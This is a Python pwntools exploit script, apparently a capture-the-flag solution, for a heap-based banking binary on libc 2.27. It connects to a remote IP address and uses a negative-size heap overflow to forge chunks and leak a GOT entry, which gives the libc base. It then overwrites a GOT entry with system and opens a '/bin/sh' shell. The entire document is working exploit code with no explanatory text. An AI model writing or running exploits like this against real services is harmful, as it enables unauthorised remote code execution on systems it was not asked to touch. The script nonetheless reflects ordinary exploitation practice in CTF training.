# libc 2.27

from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

def register(username, password, size, address, withdraw=False, amount = 0):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', username)
	r.sendlineafter(':', password)
	r.sendlineafter(':', str(size))
	r.sendlineafter(':', address)
	if withdraw:
		r.sendlineafter(':', '1')
		r.sendlineafter(':', amount)
	else:
		r.sendlineafter(':', '2')

def login(username, password):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', username)
	r.sendlineafter(':', password)

def deposit(amount):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', str(amount))

def withdraw(amount):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(amount))	

def changeName(username):
	r.sendlineafter(':', '3')
	r.sendlineafter(':', username)

def changePW(password):
	r.sendlineafter(':', '4')
	r.sendlineafter(':', password)

def updateAddress(size, address):
	r.sendlineafter(':', '5')
	r.sendlineafter(':', str(size))
	r.sendlineafter(':', address)

def logout():
	r.sendlineafter(':', '6')

def DEBUG():
	gdb.attach(r)


g_data = 0x602120
got = 0x602018

#r = process('./secure_bank')
r = remote('35.226.111.216', 3333)

register('a', 'a'*8, 8, 'a') # 0x4c73c8b 0x636cea13e1b57188
register('b', 'b'*8, 8, 'b') # 0x4c73c8c 0x636cee9b1ad0f890
login('a', 'a'*8)
updateAddress(-1, flat(0x61, 0, 0, 0x21, 0x4c73c8b, 0x636cea13e1b57188, 0, 0x41, 0x62, 0, 0, 0x1000, g_data+0x8))
logout()
login('b', 'b'*8)
updateAddress(900, flat(got))
logout()
login('b', 'b'*8)
deposit(0)
r.recvuntil('balance = ')
libc_base = int(r.recvline().strip()) - libc.symbols['printf']
print "libc_base @ ", hex(libc_base)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)

logout()
register('c', 'c'*8, 8, 'c')
login('a', 'a'*8)
updateAddress(-1, flat(0x61, 0, 0, 0x21, 0x4c73c8b, 0x636cea13e1b57188, 0, 0x41, 0x62, 0, 0, 0x1000, 0, 0, 0, 0x21, 0x62, 0, 0, 0x21, 0x0000000004c73c8c, 0x636cee9b1ad0f890, 0, 0x41, 0x63, 0, 0, 0x1000, 0x602030))
logout()
login('c', 'c'*8)
updateAddress(10, p64(system))
changePW('/bin/sh;')

#DEBUG()


r.interactive()
